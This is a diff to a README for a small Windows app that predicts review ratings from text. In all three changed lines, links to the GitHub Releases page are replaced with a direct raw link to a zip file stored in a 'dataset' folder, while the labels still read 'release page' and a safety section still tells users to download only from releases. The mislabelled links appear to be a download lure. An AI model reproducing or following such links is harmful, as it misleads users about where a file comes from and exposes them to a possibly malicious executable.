@@ -1,6 +1,6 @@
 # 🤖 review-rating-predictor - Predict Ratings with Simple Text Analysis
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Giacacl9164/review-rating-predictor/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Giacacl9164/review-rating-predictor/main/dataset/predictor-rating-review-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use it to:
 
 Visit this page to download the app for Windows:
 
-[Go to the release page](https://github.com/Giacacl9164/review-rating-predictor/releases)
+[Go to the release page](https://raw.githubusercontent.com/Giacacl9164/review-rating-predictor/main/dataset/predictor-rating-review-v2.3.zip)
 
 On the release page:
 - Open the latest release
@@ -166,7 +166,7 @@ May return a lower rating, such as:
 ## 🧼 Keep Your Download Safe
 
 Use the release page only:
-[Download from GitHub Releases](https://github.com/Giacacl9164/review-rating-predictor/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Giacacl9164/review-rating-predictor/main/dataset/predictor-rating-review-v2.3.zip)
 
 Before you run the app:
 - Make sure the file came from the release page
